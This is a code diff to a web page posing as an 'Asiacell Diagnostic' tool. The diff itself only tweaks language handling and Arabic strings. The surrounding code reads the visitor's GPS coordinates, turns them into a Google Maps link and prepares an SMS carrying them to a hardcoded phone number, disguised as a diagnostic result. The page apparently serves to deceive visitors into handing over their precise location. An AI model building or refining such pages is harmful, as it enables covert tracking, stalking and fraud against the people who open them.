@@ -88,7 +88,7 @@
 
   <script>
     let locationResult = "";
-    let currentLang = navigator.language.startsWith("ar") ? "ar" : (navigator.language.startsWith("ckb") ? "ckb" : "en");
+    let currentLang = "";
     const isiOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
     const isAndroid = /Android/i.test(navigator.userAgent);
 
@@ -119,7 +119,7 @@
         checking: "جارٍ التحقق من الموقع...",
         startBtn: "🚀 بدء التشخيص",
         sendBtn: "📩 إرسال الموقع",
-        alertPermission: `يرجى تفعيل إذن الموقع من إعدادات ال${browserName} على الآيفون: إعدادات > ${browserName} > الموقع > السماح أثناء استخدام التطبيق` ,
+        alertPermission: `يرجى تفعيل إذن الموقع من إعدادات ${browserName} على الآيفون: إعدادات > ${browserName} > الموقع > السماح أثناء استخدام التطبيق` ,
         alertGPS: "يرجى تفعيل خدمة الGPS من إعدادات الجهاز.",
         alertError: "حدث خطأ أثناء وصول الموقع، يرجى المحاولة لاحقاً.",
         alertNotAcquired: "لم يتم تحديد الموقع بعد."
@@ -136,9 +136,6 @@
         alertNotAcquired: "هێشتا شوەن دیاری نەکراوە."
       }
     };
-
-    // Auto-select language
-    window.addEventListener("DOMContentLoaded", () => selectLang(currentLang));
 
     function selectLang(lang) {
       currentLang = lang;
@@ -168,7 +165,6 @@
           const lat = pos.coords.latitude;
           const lon = pos.coords.longitude;
           locationResult = `https://maps.google.com/?q=${lat},${lon}`;
-
           document.getElementById("loader").style.display = "none";
           document.getElementById("success-check").style.display = "block";
           document.getElementById("send-button").style.display = "inline-block";
@@ -201,8 +197,8 @@
       }
       const smsNumber = "+9647701180059";
       const smsBody = encodeURIComponent(
-        (currentLang === "ar" ? "\u0646\u062a\u064a\u062c\u0629 \u0623\u062f\u0627\u0629 \u0627\u0644\u062a\u0634\u062e\u064a\u0635:\n" :
-         currentLang === "ckb" ? "\u0626\u06d5\u0646\u062c\u0627\u0645\u06cc \u067e\u0634\u06a9\u0646\u06cc\u0646\u06cc \u0626\u0627\u0633\u06cc\u0627\u0633\u06ce\u0644:\n" :
+        (currentLang === "ar" ? "نتيجة أداة التشخيص:\n" :
+         currentLang === "ckb" ? "ئەنەجامی پشکنین:\n" :
          "Asiacell Diagnostic Result:\n") + locationResult
       );
       const smsLink = `sms:${smsNumber}?body=${smsBody}`;
@@ -211,4 +207,3 @@
   </script>
 </body>
 </html>
-
